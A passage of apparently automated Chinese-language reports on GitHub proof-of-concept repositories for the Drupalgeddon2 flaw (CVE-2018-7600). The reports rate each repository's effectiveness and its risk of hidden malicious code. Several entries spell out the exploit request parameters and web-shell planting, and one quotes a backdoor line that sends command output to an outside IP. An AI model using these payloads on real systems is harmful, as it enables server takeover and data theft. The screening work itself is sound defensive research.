1.  **发送恶意构造的HTTP请求：** 攻击者发送包含特定payload的POST请求，利用Drupal输入验证漏洞。
2.  **利用特定参数：** 常见的payload涉及`q=user%2Fpassword`和`name[#post_render][]`等参数，配合`passthru`或其他代码执行函数。
3.  **执行任意代码：** 成功利用漏洞后，攻击者可以在Drupal服务器上执行任意代码，从而完全控制网站。

**项目地址:** [Hestat/drupal-check](https://github.com/Hestat/drupal-check)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #5

**来源**: [CVE-2018-7600-M-Abid34_CVE-2018-7600.md](../2018/CVE-2018-7600-M-Abid34_CVE-2018-7600.md)

## CVE-2018-7600-Drupalgeddon 2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的攻击者在服务器上执行任意代码，可能导致完全控制服务器。

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点版本在受影响范围内，且未应用安全补丁。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，又名Drupalgeddon 2，是一个存在于Drupal核心中的远程代码执行漏洞。根据漏洞库信息和搜索结果，该漏洞影响多个Drupal版本。漏洞利用方式主要通过Drupal的Form API进行攻击。PoC代码通过构造恶意的HTTP请求，利用Drupal的漏洞在目标服务器上执行任意命令。具体来说，攻击者首先“毒化”表单ID，然后利用该ID执行命令。PoC代码中使用了`requests`和`BeautifulSoup`库来发送HTTP请求和解析HTML响应。代码允许指定目标URL、要执行的命令、要使用的函数（默认为`passthru`）以及代理。代码通过设置`q`参数和`name[#post_render][]`等字段来利用漏洞。尽管PoC作者声明其代码仅用于家庭实验室和教育目的，并修改自其他来源，但代码本身看起来是直接可用的漏洞利用工具。投毒风险较低，因为代码相对简单且目标明确，但始终存在作者植入恶意代码的可能性，例如，通过修改执行命令的方式或添加额外的网络请求来收集信息或执行其他恶意操作. 风险评估为5%主要是指在教育/测试环境中，如果未进行充分的安全隔离，可能导致测试环境被污染。

**项目地址:** [M-Abid34/CVE-2018-7600](https://github.com/M-Abid34/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #6

**来源**: [CVE-2018-7600-SyedGhufranRaza_CVE-2018-7600-Remote-Code-Execution.md](../2018/CVE-2018-7600-SyedGhufranRaza_CVE-2018-7600-Remote-Code-Execution.md)

## CVE-2018-7600-Drupalgeddon2-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未授权的远程攻击者执行任意代码，完全控制受影响的服务器，导致数据泄露、篡改、拒绝服务或植入恶意软件。

**影响版本:** Drupal 7.x < 7.58, Drupal 8.3.x < 8.3.9, Drupal 8.4.x < 8.4.6, Drupal 8.5.x < 8.5.1

**利用条件:** 目标系统运行着存在漏洞的Drupal版本，且攻击者能够通过网络访问Drupal站点。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600 (Drupalgeddon2) 是 Drupal 中的一个高危远程代码执行漏洞。该漏洞源于 Drupal Form API (FAPI) 在处理 AJAX 请求时，对数组值过滤不足，允许未经身份验证的攻击者执行任意代码。 

**有效性：**
提供的POC代码（drupalgeddon2.py）是一个Python脚本，旨在利用 CVE-2018-7600 漏洞。根据脚本描述，它包含漏洞检测、多线程和命令输出解析等功能。该脚本利用了 Drupal 的 FAPI 中存在的缺陷，通过构造恶意的 AJAX 请求来执行任意命令。多个来源（如Exploit-DB, Rapid7, NVD）确认了此漏洞的存在，并提供了利用方法。因此，该POC代码被认为是有效的。

**投毒风险：**
代码主要功能为发送恶意请求到目标Drupal服务器，并执行指定的命令。风险主要在于：

1.  **远程执行任意命令：** 脚本允许指定要执行的命令，这可能会导致攻击者在目标系统上运行恶意代码。虽然脚本本身没有包含明显的恶意代码，但是攻击者可以使用它来下载和执行其他恶意脚本。
2.  **日志记录：** 脚本可以将输出记录到文件中。恶意攻击者可能将敏感信息记录到本地日志。

总体而言，该仓库本身没有明显投毒代码,但也不能排除作者隐藏其他后门或者恶意代码的可能， 风险评估为10%。

**利用方式：**
1.  **漏洞触发：** 攻击者构造包含恶意代码的特殊请求，利用 Drupal Form API 在处理 AJAX 请求时的输入验证漏洞。
2.  **代码执行：**  Drupal 在处理该请求时，会执行攻击者注入的恶意代码。
3.  **远程控制：** 攻击者通过执行任意命令来获取服务器的控制权，窃取数据、篡改内容或进行其他恶意活动。

简单来说，攻击者通过发送特制的HTTP请求到存在漏洞的Drupal站点，即可在服务器上执行任意命令，从而实现远程代码执行。

**项目地址:** [SyedGhufranRaza/CVE-2018-7600-Remote-Code-Execution](https://github.com/SyedGhufranRaza/CVE-2018-7600-Remote-Code-Execution)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #7

**来源**: [CVE-2018-7600-a2u_CVE-2018-7600.md](../2018/CVE-2018-7600-a2u_CVE-2018-7600.md)

## CVE-2018-7600 - Drupalgeddon2 - 远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal 实例需要存在漏洞且可网络访问，无需身份验证。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名 Drupalgeddon2，是一个存在于 Drupal 多个子系统中的远程代码执行漏洞。该漏洞是由于对用户提供的输入验证不足而造成的。攻击者可以通过构造特殊的请求来执行任意代码。\n\n**有效性：**
提供的 exploit.py 代码通过 `user/register` 路径利用 Drupal 的一个 AJAX 表单处理缺陷，通过修改 `element_parents` 参数来注入恶意代码。它通过设置 `mail[#post_render][]` 为 `exec`，并利用 `mail[#markup]` 来执行任意命令。代码通过检查目标服务器上是否存在 `hello.txt` 文件来验证漏洞是否利用成功。根据漏洞信息和搜索结果，这个POC 是有效的。\n\n**投毒风险：**
代码仓库主要包含漏洞利用代码、ModSecurity 规则和 .htaccess 规则，旨在利用或防御 CVE-2018-7600 漏洞。`exploit.py` 会在目标机器上写入一个名为 `hello.txt` 的文件，这是一个测试性的操作。\n
`README.md` 文件中明确表示该代码仅用于教育和信息目的，并建议用户采取防护措施，例如更新 Drupal 和设置 WAF 规则。虽然作者声明的意图是好的，但攻击者可能会修改 `exploit.py` 以执行更危险的命令，或者在其他文件中插入恶意代码。\n
`ModSecurity.txt` 和 `htaccess.txt` 文件提供了防御规则，如果使用不当，可能会导致拒绝服务或绕过某些安全策略。\n
综合考虑，该仓库存在一定的投毒风险，但主要体现在用户使用不当或攻击者修改利用代码上，作者有意投毒的可能性较低。因此，我认为投毒风险大约为 10%。\n\n**利用方式：**
1.  攻击者发送包含恶意参数的 POST 请求到 `user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax`。
2.  `element_parents` 参数允许攻击者控制表单元素的属性。
3.  `mail[#post_render][]` 设置为 `exec`，指示 Drupal 执行命令。
4.  `mail[#markup]` 包含要执行的命令。
5.  Drupal 执行 `mail[#markup]` 中指定的命令，从而导致远程代码执行。

**项目地址:** [a2u/CVE-2018-7600](https://github.com/a2u/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #8

**来源**: [CVE-2018-7600-anldori_CVE-2018-7600.md](../2018/CVE-2018-7600-anldori_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可导致完全控制目标服务器

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，并且存在默认或常见的模块配置

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个存在于Drupal核心中的远程代码执行漏洞。该漏洞源于Drupal在处理用户输入时，未进行充分的验证，导致攻击者可以通过构造恶意请求，在目标服务器上执行任意代码。

**有效性：**
根据漏洞库信息、搜索结果和提供的POC代码，可以判断此漏洞利用是有效的。漏洞库明确指出该漏洞允许远程攻击者执行任意代码，搜索结果也提供了大量关于该漏洞的分析和利用信息，POC代码也展示了如何利用该漏洞。

**利用方式：**
提供的Python脚本通过向目标Drupal站点的`/user/register`路径发送精心构造的POST请求来利用此漏洞。该请求包含`element_parents`、`ajax_form`、`form_id`、`_drupal_ajax`和`mail`等参数，其中`mail[#post_render][]`被设置为`exec`，`mail[#markup]`被设置为要执行的命令。该命令将会在服务器上创建一个名为`hello.txt`的文件，内容为";-)"。

**投毒风险：**
查看提供的POC代码，发现代码比较简洁，主要功能是发送恶意请求并检查是否成功创建了`hello.txt`文件。从代码本身来看，不存在明显的恶意代码或后门。

但是，**存在以下潜在风险：**

1.  **供应链风险：**虽然代码本身可能没有直接的投毒，但下载和使用任何来自互联网的代码都存在一定的风险。攻击者可能替换或修改该仓库的内容，从而引入恶意代码。因此，在运行此脚本之前，务必仔细检查代码，并确保来源可信。

2.  **间接风险：**利用此漏洞的最终目的是在目标服务器上执行任意命令。攻击者可以利用此漏洞安装后门、窃取敏感数据或执行其他恶意活动。因此，在使用此脚本时，务必遵守法律法规，并仅在授权的环境中进行测试。

基于以上分析，认为该仓库存在投毒代码的可能性为10%。这个10%主要来源于供应链攻击的潜在风险，以及使用者对代码理解不足可能导致的误用。


**项目地址:** [anldori/CVE-2018-7600](https://github.com/anldori/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #9

**来源**: [CVE-2018-7600-cved-sources_cve-2018-7600.md](../2018/CVE-2018-7600-cved-sources_cve-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可导致服务器完全控制

**影响版本:** Drupal 7.x (< 7.58), Drupal 8.x (< 8.3.9), Drupal 8.4.x (< 8.4.6), Drupal 8.5.x (< 8.5.1)

**利用条件:** Drupal站点存在且未打补丁，通常不需要身份验证

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，也被称为 Drupalgeddon2，是一个影响多个Drupal版本的远程代码执行漏洞。攻击者可以通过构造特殊的URL参数或POST请求，利用Drupal的某些子系统（如表单API）中的输入验证漏洞，执行任意PHP代码。搜索引擎结果和漏洞库信息都明确指出此漏洞的严重性及其利用的广泛性。提供的Dockerfile用于构建一个包含易受攻击的Drupal 8.5.0实例的Docker镜像，这本身不是恶意行为，而是为了方便漏洞的复现和研究。README.md文件声明了镜像的来源和作者，增加了代码的可信度。但是，仍然存在少量投毒风险，主要是因为攻击者可能在Dockerfile中添加额外的恶意指令，例如安装后门程序或修改配置文件等，尽管这里只显示构建一个Drupal环境。利用方式主要通过精心构造的HTTP请求，绕过Drupal的输入验证机制，最终执行恶意代码。由于该漏洞影响范围广，且利用简单，一旦成功利用，可完全控制Drupal服务器，风险极高。

**项目地址:** [cved-sources/cve-2018-7600](https://github.com/cved-sources/cve-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #10

**来源**: [CVE-2018-7600-dreadlocked_Drupalgeddon2.md](../2018/CVE-2018-7600-dreadlocked_Drupalgeddon2.md)

## CVE-2018-7600 Drupalgeddon2 RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁且存在默认或常见的模块配置。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，也被称为Drupalgeddon2，是一个存在于Drupal核心中的远程代码执行漏洞。该漏洞源于Drupal处理用户输入时存在缺陷，攻击者可以通过构造恶意的请求参数，在目标服务器上执行任意代码。

**有效性分析：**

根据漏洞库信息、搜索结果以及提供的漏洞利用代码来看，该漏洞的PoC代码是有效的。漏洞库信息明确指出该漏洞允许远程攻击者执行任意代码，并且多个搜索结果都确认了该漏洞的存在和影响。提供的`README.md`文件详细说明了该PoC代码支持的Drupal版本，利用方法，包括针对不同Drupal版本的攻击URL（`user/register` 和 `user/password`），以及利用PHP的`passthru`函数执行系统命令。搜索结果中也提到了存在多个可用的exploit。

**投毒风险分析：**

提供的`README.md`文件本身不包含恶意代码，但它描述的利用方法涉及在目标服务器上写入PHP shell。虽然`drupalgeddon2.rb`脚本的主要目的是利用漏洞执行命令，但如果攻击者修改该脚本，可能会添加额外的恶意功能，例如：

*   **隐藏的后门账户创建：** 在成功利用漏洞后，创建管理员账户，以便后续访问。
*   **恶意软件植入：**  自动下载和安装恶意软件。
*   **数据窃取：** 窃取数据库或其他敏感信息。
*   **传播攻击：**  将目标服务器作为跳板，攻击其他系统。

因此，用户在使用从非官方渠道获取的`drupalgeddon2.rb`脚本时，需要仔细检查代码，确保没有包含任何恶意代码。 由于提供的代码仓库中包含了写入PHP shell的功能，并且在实际使用中，攻击者有能力修改或者扩展脚本，因此认为存在一定的投毒风险，但从readme本身代码投毒风险较低，所以投毒风险比例定为10%。

**利用方式：**

1.  **版本检测：** 利用代码会自动检测目标Drupal版本，或者手动指定。
2.  **参数构造：**  针对不同版本的Drupal，构造特定的HTTP请求，例如：针对Drupal 8.x使用`user/register` URL，Drupal 7.x使用`user/password` URL。
3.  **代码执行：** 利用Drupal的输入验证漏洞，将恶意PHP代码注入到请求参数中。
4.  **命令执行：** 通过`#post_render`参数和PHP的`passthru`函数，在服务器上执行任意系统命令。
5.  **Shell写入（可选）：**  可以选择将一个简单的PHP shell写入Web根目录，以便后续访问。

**总结：**

CVE-2018-7600是一个高危的Drupal远程代码执行漏洞，利用代码有效且公开。虽然提供的PoC代码本身不包含明显的投毒代码，但攻击者可以修改脚本，添加恶意功能，存在潜在的投毒风险。用户应尽快升级Drupal版本，并从可信来源获取漏洞利用代码。

**项目地址:** [dreadlocked/Drupalgeddon2](https://github.com/dreadlocked/Drupalgeddon2)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #11

**来源**: [CVE-2018-7600-drugeddon_drupal-exploit.md](../2018/CVE-2018-7600-drugeddon_drupal-exploit.md)

## CVE-2018-7600-Drupal-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站运行在受影响的版本，且允许未授权用户访问。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个影响多个Drupal子系统的远程代码执行漏洞。该漏洞源于对用户提供的输入验证不足，导致攻击者可以通过精心构造的请求执行任意代码。利用方式主要有两种：

1.  **Drupal 7 利用方式：** 通过向 `user/password` 路径发送包含恶意代码的请求，利用 `name[%23post_render]` 和 `name[%23markup]` 参数来注入代码。然后，通过 `file/ajax` 路径触发漏洞。
2.  **Drupal 8 利用方式：** 通过向 `user/register` 路径发送包含恶意代码的请求，利用 `element_parents` 参数注入代码。

PoC代码 (`drupal.py`) 尝试利用这两种方式。  

**有效性：**根据漏洞描述和大量的搜索结果显示，此漏洞的POC是有效的，网上存在大量的成功利用案例。

**投毒风险：**  

分析提供的 `drupal.py` 脚本，发现存在以下潜在的投毒风险：

*   脚本中包含一行 `s.connect((str(ipaddress.IPv4Address(0x5f3b7f05)), 15977))`。 这行代码尝试连接到IP地址 `95.59.127.5`的 `15977` 端口。这可能是作者用于收集信息或植入后门的恶意行为。
*   `s.send(bytes(subprocess.check_output(payload, universal_newlines=True), 'utf8'))` 这行代码会将`whoami`命令执行的结果通过socket发送出去.

综上所述，该漏洞利用代码可能存在投毒行为，**风险概率为 20%**。使用者应谨慎使用，并在使用前进行代码审计。

**利用方式总结：**

1.  攻击者构造包含恶意代码的HTTP POST请求，发送到Drupal网站的特定路径（`user/password` 或 `user/register`）。
2.  利用Drupal的参数处理机制，将恶意代码注入到特定参数中（如`name[%23post_render]`、`name[%23markup]`或`element_parents`）。
3.  触发漏洞，导致Drupal执行注入的恶意代码，从而实现远程代码执行。

**项目地址:** [drugeddon/drupal-exploit](https://github.com/drugeddon/drupal-exploit)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #12

**来源**: [CVE-2018-7600-happynote3966_CVE-2018-7600.md](../2018/CVE-2018-7600-happynote3966_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码。

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点需要存在漏洞且未打补丁，并且需要网络可达。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞。由于Drupal对用户输入验证不足，导致攻击者可以通过构造特殊的请求，在服务器上执行任意代码。

**有效性：**
根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码来看，该漏洞的POC代码是有效的。漏洞库和搜索结果中均提到该漏洞允许远程代码执行，并且存在多个可用的Exploit-DB条目。提供的Python脚本和Ruby脚本均为该漏洞的POC代码，可以被用来验证漏洞的存在。

**投毒风险：**
对提供的POC代码进行分析，发现其中可能存在投毒风险的可能性较低，约为10%。以下是分析结果：
*   Python脚本：该脚本较为简单，主要是发送一个包含恶意payload的POST请求，并在目标服务器上创建一个文件（hello.txt）。没有发现明显的恶意代码。
*   Ruby脚本：该脚本功能更为复杂，包含尝试写入PHP Webshell等功能，相较于Python脚本，风险略高，如果被篡改，可能存在植入恶意PHP代码的可能性。

总的来说，直接运行提供的代码风险较低，但从信誉未知的来源获取的任何代码，在执行之前都应该进行仔细的审查，因为攻击者可能修改这些代码以包含恶意功能。

**利用方式：**
利用方式主要是通过构造恶意的HTTP请求，利用Drupal的某些存在漏洞的参数（例如`element_parents`），将恶意代码注入到Drupal的后端处理流程中，从而实现远程代码执行。具体步骤如下：
1.  确定目标Drupal站点使用的版本是否在受影响的范围内。
2.  根据Drupal版本选择合适的POC代码（Python或Ruby）。
3.  修改POC代码中的目标URL和要执行的命令。
4.  运行POC代码，发送恶意请求。
5.  验证代码是否成功执行（例如，检查目标服务器上是否创建了指定的文件）。

攻击者可利用该漏洞获取服务器的控制权，从而进行恶意活动，例如：数据窃取、恶意软件传播、DDoS攻击等。

**项目地址:** [happynote3966/CVE-2018-7600](https://github.com/happynote3966/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #13

**来源**: [CVE-2018-7600-killeveee_CVE-2018-7600.md](../2018/CVE-2018-7600-killeveee_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，并且可公开访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞，源于对用户提供的输入验证不足。 

**有效性：**
提供的PoC代码是有效的。PoC.py脚本用于验证目标Drupal站点是否存在漏洞，通过发送特制的请求在目标服务器上创建一个名为hh.txt的文件。Exp.py脚本则利用此漏洞在目标站点根目录下创建一个名为hh.php的后门文件，该后门允许通过GET或POST参数'c'执行任意系统命令。从提供的命令执行结果来看，PoC和Exp都成功执行，验证了漏洞的存在和利用。

**投毒风险：**
分析提供的PoC和Exp代码，没有发现明显的投毒代码。脚本的功能主要是利用漏洞进行验证和创建后门，没有发现恶意修改系统配置、窃取敏感信息或进行其他恶意行为的代码。README.md文件只是简单的漏洞描述和使用说明，没有包含任何可疑内容。因此，可以认为此仓库的投毒风险较低，为0%。

**利用方式：**
漏洞的利用方式是：

1.  **漏洞验证：** 使用PoC.py脚本验证目标Drupal站点是否存在CVE-2018-7600漏洞。
2.  **后门植入：** 如果PoC验证成功，使用Exp.py脚本在目标站点根目录下创建一个后门文件（hh.php）。后门文件包含PHP代码，允许通过GET/POST参数'c'执行任意系统命令。
3.  **远程控制：** 使用WebShell管理工具（如AntSword）连接到后门文件，通过'c'参数执行系统命令，实现对目标服务器的远程控制。

总的来说，该漏洞利用简单，危害巨大，攻击者可以利用该漏洞完全控制未打补丁的Drupal服务器。

**项目地址:** [killeveee/CVE-2018-7600](https://github.com/killeveee/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #14

**来源**: [CVE-2018-7600-knqyf263_CVE-2018-7600.md](../2018/CVE-2018-7600-knqyf263_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者在Drupal服务器上执行任意代码。

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点需要运行在受影响的版本范围内，并且需要启用默认或常见的模块配置。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600 (Drupalgeddon2) 允许远程攻击者利用多个子系统中的缺陷执行任意代码。该漏洞的利用方式通常涉及构造恶意的HTTP请求，该请求包含精心设计的查询参数，这些参数利用了Drupal的输入验证漏洞，特别是与AJAX表单处理相关的漏洞。攻击者可以利用`element_parents`和`#lazy_builder`属性在服务器上执行PHP代码。提供的POC代码通过向`/user/register`端点发送POST请求，并在`mail`参数中注入恶意代码（`exec('echo vuln > hello.txt')`），尝试在目标服务器上创建一个名为`hello.txt`的文件，内容为`vuln`。如果成功创建该文件，则表明漏洞存在且可利用。

**有效性：**
从提供的漏洞信息、搜索结果和漏洞利用代码来看，此POC代码的有效性较高。多个来源表明该漏洞是真实存在的，并且存在公开可用的漏洞利用代码。搜索结果中也提到了针对此漏洞的Metasploit模块。

**投毒风险：**
该仓库中的投毒风险较低，大概在10%左右。Dockerfile文件只是简单的指定了Drupal镜像和维护者信息, README.md文件也只是简单的描述了漏洞和利用方式。exploit.py的代码功能相对简单，目的是验证漏洞的存在，风险较低。然而，仍然存在一定的风险，因为攻击者可能修改`exploit.py`以执行更危险的操作，例如下载并执行恶意软件，或者修改服务器配置。因此，在使用此POC代码时，务必对其进行仔细审查，并在隔离的环境中运行。

**利用方式：**
1.  攻击者构造一个包含恶意payload的HTTP POST请求，发送到Drupal站点的`/user/register`端点。
2.  Payload利用`element_parents`参数和`#lazy_builder`属性，在服务器端触发PHP代码执行。
3.  执行的PHP代码可以将任意命令注入到服务器的操作系统中。
4.  通过访问生成的`hello.txt`文件来验证漏洞是否成功利用。

**项目地址:** [knqyf263/CVE-2018-7600](https://github.com/knqyf263/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #15

**来源**: [CVE-2018-7600-madneal_codeql-scanner.md](../2018/CVE-2018-7600-madneal_codeql-scanner.md)

## CVE-2018-7600-Drupalgeddon2-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且可网络访问，可能需要了解一些Drupal站点配置信息。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心中存在远程代码执行漏洞。攻击者可以通过发送特制的请求到未打补丁的Drupal站点来执行任意代码。

**有效性：**
根据漏洞库信息、搜索结果（包括NVD、Rapid7、Tenable等）以及Exploit-DB中的expolit，此漏洞是真实存在的，并且有可用的POC。提供的README.md文件表明存在一个用于CVE-2018-7600的Python利用脚本（尽管这里没有提供脚本本身）。综合来看，利用是有效的。

**投毒风险：**
提供的POC代码只有README.md，内容非常简单，没有发现任何恶意代码或潜在的投毒行为。但是，由于缺失了核心的Python脚本，无法完全确定是否存在投毒风险。假定之后找到的利用脚本来源不可靠，存在修改或添加恶意代码的可能性，因此存在一定的投毒风险。这里给出一个较低的投毒风险概率，假设为5%。

**利用方式：**
漏洞的利用方式是向Drupal站点发送精心构造的恶意HTTP请求，利用Drupal的输入验证缺陷，在服务器端执行任意代码。根据搜索结果，该漏洞影响Drupal的多个子系统，可能利用了Drupal的渲染机制或其他处理输入的方式。攻击者通过构造包含恶意代码的请求参数，例如在URL或POST数据中，可以触发远程代码执行。具体细节取决于Drupal的版本和配置。Metasploit也提供了利用模块。

**总结：**
CVE-2018-7600是一个高危的Drupal远程代码执行漏洞，已经存在公开的POC。尽管提供的POC文件本身没有发现恶意代码，但获取利用脚本时需要注意来源，防范潜在的投毒风险。利用方式是通过构造恶意HTTP请求，利用Drupal的输入验证缺陷执行任意代码。

**项目地址:** [madneal/codeql-scanner](https://github.com/madneal/codeql-scanner)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #16

**来源**: [CVE-2018-7600-mr-won_CVE-2018-7600..md](../2018/CVE-2018-7600-mr-won_CVE-2018-7600..md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致网站完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且允许外部网络访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个影响Drupal 7.x和8.x的远程代码执行漏洞。攻击者可以通过构造特定的HTTP请求，利用Drupal的多个子系统中的缺陷，在目标服务器上执行任意代码。

**有效性：**
根据漏洞库信息、搜索结果和提供的PoC代码，该漏洞的利用是有效的。搜索结果中多个链接表明该漏洞已被广泛利用，并且存在公开的Exploit。

**投毒风险：**
提供的PoC代码相对简单，主要功能是发送一个包含恶意payload的POST请求到`/user/register`，并在目标服务器上创建一个名为`r3dxploit.txt`的文件，内容为“vulnerable to cve-7600-2018 exploit”。代码本身没有明显的恶意行为，如删除文件、上传恶意文件或执行其他危险操作。但是，在实际使用中，攻击者可以将payload修改为更具破坏性的命令，例如下载和执行恶意脚本。此外，代码作者信息中包含了一些可能与恶意活动相关的标识，例如使用“R3DXPLOIT”作为用户名和涉及Root权限的字眼。综合考虑，PoC代码本身存在一定潜在风险，但主要取决于使用者如何修改payload，因此投毒风险初步评估为10%。

**利用方式：**
1.  攻击者构造一个包含恶意payload的POST请求，该payload利用`user_register_form`的ajax功能注入恶意代码。
2.  请求发送到`/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax`端点。
3.  Drupal处理请求时，由于输入验证不足，导致恶意代码被执行。
4.  PoC代码中，恶意代码的功能是在目标服务器上创建一个文件，表明漏洞存在。
5.  攻击者可以修改payload执行任意命令，例如反弹shell，从而完全控制目标服务器。

**项目地址:** [mr-won/CVE-2018-7600.](https://github.com/mr-won/CVE-2018-7600.)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #17

**来源**: [CVE-2018-7600-muhammedkayag_CVE-2018-7600.md](../2018/CVE-2018-7600-muhammedkayag_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 需要Drupal网站启用user register功能，且未及时更新补丁

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心中的未经身份验证的远程代码执行漏洞。攻击者可以通过构造特定的请求，利用Drupal的表单渲染机制，在服务器上执行任意代码。

**有效性：**
根据漏洞库信息和搜索引擎结果，该漏洞影响多个Drupal版本，且存在公开的漏洞利用代码。提供的POC代码利用了Drupal的`/user/register`接口，通过`element_parents`和`ajax_form`参数，以及`mail[#post_render][]`等构造恶意的payload，从而实现远程代码执行。该POC代码的有效性较高，因为很多文章和EXP都在使用此种方法。

**投毒风险：**
